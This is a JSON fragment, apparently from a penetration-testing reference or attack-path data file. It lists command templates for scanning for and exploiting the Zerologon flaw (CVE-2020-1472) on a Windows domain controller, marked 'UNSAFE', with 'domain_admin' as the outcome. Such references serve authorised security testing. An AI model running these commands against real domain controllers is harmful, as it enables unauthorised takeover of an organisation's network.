        {
          "tool": "zerologon-scan",
          "command": "zerologon-scan '<dc_netbios_name>' '<ip>'",
          "description": "Scan for Zerologon vulnerability"
        },
        {
          "tool": "cve-2020-1472-exploit.py",
          "command": "cve-2020-1472-exploit.py <MACHINE_BIOS_NAME> <ip>",
          "description": "Exploit Zerologon (UNSAFE)"
        }
      ],
      "outcomes": ["domain_admin"]
